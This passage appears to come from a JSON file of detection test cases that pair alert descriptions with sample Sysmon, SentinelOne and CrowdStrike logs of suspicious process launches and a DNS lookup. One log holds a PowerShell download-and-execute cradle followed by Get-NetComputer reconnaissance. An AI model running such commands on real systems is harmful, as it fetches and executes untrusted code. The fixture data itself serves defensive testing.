            "<14>Sep 22 04:57:15 sftp.cachemoney.local Microsoft-Windows-Sysmon[3196]: {\"EventTime\":1726894635,\"Hostname\":\"sftp.cachemoney.local\",\"Keywords\":-9223372036854775808,\"EventType\":\"INFO\",\"SeverityValue\":2,\"Severity\":\"INFO\",\"EventID\":1,\"SourceName\":\"Microsoft-Windows-Sysmon\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"Version\":5,\"Task\":1,\"OpcodeValue\":0,\"RecordNumber\":212667,\"ProcessID\":3196,\"ThreadID\":4204,\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Domain\":\"NT AUTHORITY\",\"AccountName\":\"SYSTEM\",\"UserID\":\"S-1-5-20\",\"AccountType\":\"User\",\"Message\":\"Process Create:\\r\\nRuleName: -\\r\\nUtcTime: 2024-09-21 04:57:15.069\\r\\nProcessGuid: {f31bccf6-d0ef-642a-9517-000000001500}\\r\\nProcessId: 6224\\r\\nImage: C:\\\\ProgramData\\\\WMI hosts\\\\WMIhosts.exe\\r\\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\\r\\nDescription: WMI Hosts\\r\\nProduct: WMIHosts.exe\\r\\nCompany: Microsoft WMI Hosts\\r\\nOriginalFileName: WMIHosts.exe\\r\\nCommandLine: \\\"C:\\\\ProgramData\\\\WMI hosts\\\\WMIhosts.exe\\\"\\r\\nCurrentDirectory: C:\\\\ProgramData\\\\WMI hosts\\\\\\r\\nUser: CACHEMONEY\\\\adminsftp\\r\\nLogonGuid: {f31bccf6-d0ef-642a-9a81-b51000000000}\\r\\nLogonId: 0x10B5819A\\r\\nTerminalSessionId: 0\\r\\nIntegrityLevel: High\\r\\nHashes: MD5=93D6932BAF35FCE2591D5FE10D3C272B,SHA256=98DA115742244728861B78C9091590039A93FAF0E3DA02DA655664E66684DE33,IMPHASH=3ABE302B6D9A1256E6A915429AF4FFD2\\r\\nParentProcessGuid: {f31bccf6-92c6-6412-2700-000000001500}\\r\\nParentProcessId: 1692\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\svchost.exe\\r\\nParentCommandLine: C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule\\r\\nParentUser: NT AUTHORITY\\\\SYSTEM\",\"Category\":\"Process Create (rule: ProcessCreate)\",\"Opcode\":\"Info\",\"RuleName\":\"-\",\"UtcTime\":\"2024-09-21 04:57:15.069\",\"ProcessGuid\":\"{f31bccf6-d0ef-642a-9517-000000001500}\",\"Image\":\"C:\\\\ProgramData\\\\WMI hosts\\\\WMIhosts.exe\",\"FileVersion\":\"10.0.17763.1697 (WinBuild.160101.0800)\",\"Description\":\"WMI Hosts\",\"Product\":\"WMIHosts.exe\",\"Company\":\"Microsoft WMI Hosts\",\"OriginalFileName\":\"WMIHosts.exe\",\"CommandLine\":\"\\\"C:\\\\ProgramData\\\\WMI hosts\\\\WMIhosts.exe\\\"\",\"CurrentDirectory\":\"C:\\\\ProgramData\\\\WMI hosts\\\\\",\"User\":\"CACHEMONEY\\\\adminsftp\",\"LogonGuid\":\"{f31bccf6-d0ef-642a-9a81-b51000000000}\",\"LogonId\":\"0x10b5819a\",\"TerminalSessionId\":\"0\",\"IntegrityLevel\":\"High\",\"Hashes\":\"MD5=93D6932BAF35FCE2591D5FE10D3C272B,SHA256=98DA115742244728861B78C9091590039A93FAF0E3DA02DA655664E66684DE33,IMPHASH=3ABE302B6D9A1256E6A915429AF4FFD2\",\"ParentProcessGuid\":\"{f31bccf6-92c6-6412-2700-000000001500}\",\"ParentProcessId\":\"1692\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\svchost.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule\",\"ParentUser\":\"NT AUTHORITY\\\\SYSTEM\",\"EventReceivedTime\":1726894635,\"SourceModuleName\":\"in_sysmon\",\"SourceModuleType\":\"im_msvistalog\"}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\svchost.exe"
        ]
    },
    "171": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitypowershell.exe launched by powershell.exe",
        "ini_data": [
            "{\"@timestamp\":1732253474299,\"meta\":{\"traceId\":\"01GE20GABCTSA2Q413A1M1P9HT\",\"accountId\":\"553410142016245253\",\"osFamily\":\"windows\",\"computerName\":\"DESKTOP1\",\"agentVersion\":\"S1-WIN/21.7.5.1080\",\"siteId\":\"239629223416646331\",\"osRevision\":\"19042\",\"osName\":\"Windows 10 Enterprise\",\"uuid\":\"0c422588231f4d5ab2de15490c8f2361\",\"seqId\":0,\"machineType\":\"desktop\",\"mgmtUrl\":\"https://sg-prod.sentinelone.net\"},\"event\":{\"parent\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"425855B6823E7E61\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":0,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":206,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":159,\"osChildProcess\":1,\"modelChildProcess\":1,\"crossProcessOpenProcess\":0,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"6212826804D001B2\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17322534742915951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"36c5d12033b2eaf251bae61c00690ffb17fddc87\",\"sha256\":\"908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53\",\"md5\":\"cda48fc75952ad12d99e526d0b6bf70a\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"253768\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Windows PowerShell\",\"fullPid\":{\"pid\":11224,\"startTime\":{\"millisecondsSinceEpoch\":\"1732253474299\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:36595/'); Get-NetComputer -ping -operatingsystem *server*\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"process\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":1,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":52,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":0,\"osChildProcess\":0,\"modelChildProcess\":0,\"crossProcessOpenProcess\":1,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"68F355F95F451218\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17322534742995951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"862208\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"C6BB4940F0BFA542\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Task Scheduler Configuration Tool\",\"fullPid\":{\"pid\":3244,\"startTime\":{\"millisecondsSinceEpoch\":\"1732253474299\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"\\\\??\\\\C:\\\\WINDOWS\\\\system32\\\\schtasks.exe 0xffffffff -ForceV1\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"type\":\"processCreation\",\"status\":\"UNKNOWN\"}}\r\nudm.principal.process.file.full_path: C:\\WINDOWS\\System32\\powershell.exe\r\nudm.principal.process.file.sha256: 908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53"
        ]
    },
    "172": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitysonic.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\sonic.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=A55DB6BFA7DEDECF7365567B803CB013,SHA256=01153CFE9FE9F1C3460E02D254BBE49B7B07C343061B7630234D95948D8F6106,IMPHASH=31E8556425EF4035DBFC678A002AD91B\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\sonic.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"GorgerousOnce.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4966\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2306,\"ProcessId\":\"10146\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379906,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":706,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-09-27 04:33:30.116\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "173": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityF20B.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\F20B.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=317C1DA3D49D534FDDE575395DA84879,SHA256=72674E9A3C32D5457C98EF723B938ABC0295329C7EC58F9E07A0CB1E99631F48,IMPHASH=84E31D32A2CB7830E40CFCBEA395C7A1\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\F20B.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-8F33-6539-44AD-030000000000}\",\"LogonId\":\"0x3ad44\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-8F34-6539-6A00-000000003B00}\",\"ParentProcessId\":\"4944\",\"ProcessGuid\":\"{C784477D-ACAA-653D-7D06-000000003B00}\",\"ProcessID\":2332,\"ProcessId\":\"6284\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":462620,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":696,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2025-01-04 05:32:21.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "174": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitymyfile.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\myfile.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=2B248E9302A441C389C30A85534C0CC2,SHA256=05D6B2F8A9C4C319CA23E571B9BD77142F3C880524A67B6F6783550AF620374B,IMPHASH=9F9C7E0B30ED8F52F90B658711975D4C\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\myfile.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"myfile.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4965\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2305,\"ProcessId\":\"10145\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379905,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":705,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-30 05:32:11.115\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "175": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityexecutable.exe launched by sandbox-control.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\executable.exe\\\" \",\"Company\":\"-\",\"Computer\":\"DESKTOP-SM\",\"CurrentDirectory\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=71826BA081E303866CE2A2534491A2F7,SHA256=62099532750DAD1054B127689680C38590033FA0BDFA4FB40C7B4DCB2607FB11,IMPHASH=AFCDF79BE1557326C854B6E20CB900A7\",\"Hostname\":\"stevemorris-pc\",\"Image\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\executable.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-A5DD-61A4-355F-030000000000}\",\"LogonId\":\"0x35f35\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"\\\"sandbox-control.exe\\\"\",\"ParentImage\":\"sandbox-control.exe\",\"ParentProcessGuid\":\"{C784477D-A6BC-61A4-F705-000000003C00}\",\"ParentProcessId\":\"6400\",\"ProcessGuid\":\"{C784477D-F8D0-6221-2706-000000003C00}\",\"ProcessID\":2200,\"ProcessId\":\"3848\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":84589,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":3056,\"User\":\"DESKTOP-SM\\\\stevemorris\",\"UserID\":\"S-1-5-12-783622181-14434791-6080415151-691320\",\"UtcTime\":\"2024-11-20 05:32:01.000000\",\"Version\":5}\r\nudm.principal.process.file.full_path: sandbox-control.exe"
        ]
    },
    "176": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityWMIhosts.exe launched by svchost.exe",
        "ini_data": [
            "<14>Nov 17 05:56:01 sftp.cachemoney.local Microsoft-Windows-Sysmon[3196]: {\"EventTime\":1731736561,\"Hostname\":\"sftp.cachemoney.local\",\"Keywords\":-9223372036854775808,\"EventType\":\"INFO\",\"SeverityValue\":2,\"Severity\":\"INFO\",\"EventID\":1,\"SourceName\":\"Microsoft-Windows-Sysmon\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"Version\":5,\"Task\":1,\"OpcodeValue\":0,\"RecordNumber\":212667,\"ProcessID\":3196,\"ThreadID\":4204,\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Domain\":\"NT AUTHORITY\",\"AccountName\":\"SYSTEM\",\"UserID\":\"S-1-5-20\",\"AccountType\":\"User\",\"Message\":\"Process Create:\\r\\nRuleName: -\\r\\nUtcTime: 2024-11-16 05:56:01.069\\r\\nProcessGuid: {f31bccf6-d0ef-642a-9517-000000001500}\\r\\nProcessId: 6224\\r\\nImage: C:\\\\ProgramData\\\\WMI hosts\\\\WMIhosts.exe\\r\\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\\r\\nDescription: WMI Hosts\\r\\nProduct: WMIHosts.exe\\r\\nCompany: Microsoft WMI Hosts\\r\\nOriginalFileName: WMIHosts.exe\\r\\nCommandLine: \\\"C:\\\\ProgramData\\\\WMI hosts\\\\WMIhosts.exe\\\"\\r\\nCurrentDirectory: C:\\\\ProgramData\\\\WMI hosts\\\\\\r\\nUser: CACHEMONEY\\\\adminsftp\\r\\nLogonGuid: {f31bccf6-d0ef-642a-9a81-b51000000000}\\r\\nLogonId: 0x10B5819A\\r\\nTerminalSessionId: 0\\r\\nIntegrityLevel: High\\r\\nHashes: MD5=93D6932BAF35FCE2591D5FE10D3C272B,SHA256=98DA115742244728861B78C9091590039A93FAF0E3DA02DA655664E66684DE33,IMPHASH=3ABE302B6D9A1256E6A915429AF4FFD2\\r\\nParentProcessGuid: {f31bccf6-92c6-6412-2700-000000001500}\\r\\nParentProcessId: 1692\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\svchost.exe\\r\\nParentCommandLine: C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule\\r\\nParentUser: NT AUTHORITY\\\\SYSTEM\",\"Category\":\"Process Create (rule: ProcessCreate)\",\"Opcode\":\"Info\",\"RuleName\":\"-\",\"UtcTime\":\"2024-11-16 05:56:01.069\",\"ProcessGuid\":\"{f31bccf6-d0ef-642a-9517-000000001500}\",\"Image\":\"C:\\\\ProgramData\\\\WMI hosts\\\\WMIhosts.exe\",\"FileVersion\":\"10.0.17763.1697 (WinBuild.160101.0800)\",\"Description\":\"WMI Hosts\",\"Product\":\"WMIHosts.exe\",\"Company\":\"Microsoft WMI Hosts\",\"OriginalFileName\":\"WMIHosts.exe\",\"CommandLine\":\"\\\"C:\\\\ProgramData\\\\WMI hosts\\\\WMIhosts.exe\\\"\",\"CurrentDirectory\":\"C:\\\\ProgramData\\\\WMI hosts\\\\\",\"User\":\"CACHEMONEY\\\\adminsftp\",\"LogonGuid\":\"{f31bccf6-d0ef-642a-9a81-b51000000000}\",\"LogonId\":\"0x10b5819a\",\"TerminalSessionId\":\"0\",\"IntegrityLevel\":\"High\",\"Hashes\":\"MD5=93D6932BAF35FCE2591D5FE10D3C272B,SHA256=98DA115742244728861B78C9091590039A93FAF0E3DA02DA655664E66684DE33,IMPHASH=3ABE302B6D9A1256E6A915429AF4FFD2\",\"ParentProcessGuid\":\"{f31bccf6-92c6-6412-2700-000000001500}\",\"ParentProcessId\":\"1692\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\svchost.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule\",\"ParentUser\":\"NT AUTHORITY\\\\SYSTEM\",\"EventReceivedTime\":1731736561,\"SourceModuleName\":\"in_sysmon\",\"SourceModuleType\":\"im_msvistalog\"}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\svchost.exe"
        ]
    },
    "177": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityF20B.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\F20B.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=317C1DA3D49D534FDDE575395DA84879,SHA256=72674E9A3C32D5457C98EF723B938ABC0295329C7EC58F9E07A0CB1E99631F48,IMPHASH=84E31D32A2CB7830E40CFCBEA395C7A1\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\F20B.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-8F33-6539-44AD-030000000000}\",\"LogonId\":\"0x3ad44\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-8F34-6539-6A00-000000003B00}\",\"ParentProcessId\":\"4944\",\"ProcessGuid\":\"{C784477D-ACAA-653D-7D06-000000003B00}\",\"ProcessID\":2332,\"ProcessId\":\"6284\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":462620,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":696,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-09 05:32:26.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "178": {
        "alert_brief": "Alert on known Hash querying a known hostname with VT Relationshipsto manygoodnews.com",
        "ini_data": [
            "{\"event_simpleName\":\"DnsRequest\",\"ContextTimeStamp\":\"1717461377\",\"ConfigStateHash\":\"9542156506\",\"ContextProcessId\":\"8960054625103\",\"DomainName\":\"manygoodnews.com\",\"ContextThreadId\":\"967634005093619\",\"aip\":\"10.8.13.29\",\"QueryStatus\":\"87\",\"InterfaceIndex\":\"0\",\"ConfigBuild\":\"1007.3.0011809.1\",\"event_platform\":\"Win\",\"DnsRequestCount\":\"1\",\"DualRequest\":\"1\",\"Entitlements\":\"15\",\"name\":\"DnsRequestV4\",\"id\":\"217339fb-172e-4bf1-a397-e92639d6080a\",\"EffectiveTransmissionClass\":\"3\",\"aid\":\"e2327adb69e83e6f9deaf40da1e4c653\",\"timestamp\":\"1717475778\",\"cid\":\"b140194b2ba51f0ba1e93ba0187310b2\",\"RequestType\":\"1\",\"UserName\":\"adablack\"}\r\nudm.principal.process.file.full_path: \\Device\\HarddiskVolume1\\Program Files\\C:\\Users\\adablack\\Downloads\\Client Update.exe\r\nudm.principal.process.file.sha256: c10cd1c78c180ba657e3921ee9421b9abd5b965c4cdfaa94a58e383b45bb72ca"
        ]
    },
    "179": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitypowershell.exe launched by powershell.exe",
        "ini_data": [
            "{\"@timestamp\":1731562276297,\"meta\":{\"traceId\":\"01GE20GAECTSA2Q413A1M1P9HT\",\"accountId\":\"553410142016245253\",\"osFamily\":\"windows\",\"computerName\":\"DESKTOP1\",\"agentVersion\":\"S1-WIN/21.7.5.1080\",\"siteId\":\"239629223416646331\",\"osRevision\":\"19042\",\"osName\":\"Windows 10 Enterprise\",\"uuid\":\"0c422588231f4d5ab2de15490c8f2361\",\"seqId\":0,\"machineType\":\"desktop\",\"mgmtUrl\":\"https://sg-prod.sentinelone.net\"},\"event\":{\"parent\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"425855B6823E7E61\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":0,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":206,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":159,\"osChildProcess\":1,\"modelChildProcess\":1,\"crossProcessOpenProcess\":0,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"6212826804D001B2\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17315622762915951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"36c5d12033b2eaf251bae61c00690ffb17fddc87\",\"sha256\":\"908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53\",\"md5\":\"cda48fc75952ad12d99e526d0b6bf70a\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"253768\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Windows 